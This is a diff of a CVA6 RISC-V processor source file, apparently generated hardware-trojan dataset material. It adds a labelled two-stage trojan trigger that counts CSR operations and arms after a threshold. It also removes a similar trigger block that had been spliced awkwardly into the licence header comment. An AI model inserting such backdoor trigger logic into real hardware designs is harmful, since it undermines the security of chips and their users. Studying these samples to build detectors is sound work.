@@ -1,27 +1,6 @@
 // Copyright 2017-2019 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 6853;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|mode) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && Bypasses) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -782,6 +761,26 @@ module cva6_trojan_Privilege
       .dcache_req_ports_i  (dcache_req_ports_cache_id),
       .dcache_req_ports_o  (dcache_req_ports_id_cache)
   );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=8376)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 8376;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
 
   logic [CVA6Cfg.NrWbPorts-1:0][CVA6Cfg.TRANS_ID_BITS-1:0] trans_id_ex_id;
   logic [CVA6Cfg.NrWbPorts-1:0][CVA6Cfg.XLEN-1:0] wbdata_ex_id;
@@ -1884,8 +1883,5 @@ module cva6_trojan_Privilege
     else $fatal(1, "Accelerator is not supported by superscalar pipeline");
   end
   //pragma translate_on
-
-
-    localparam logic [1:0] PRIV_LVL_M = 2'b11;
 
 endmodule  // ariane
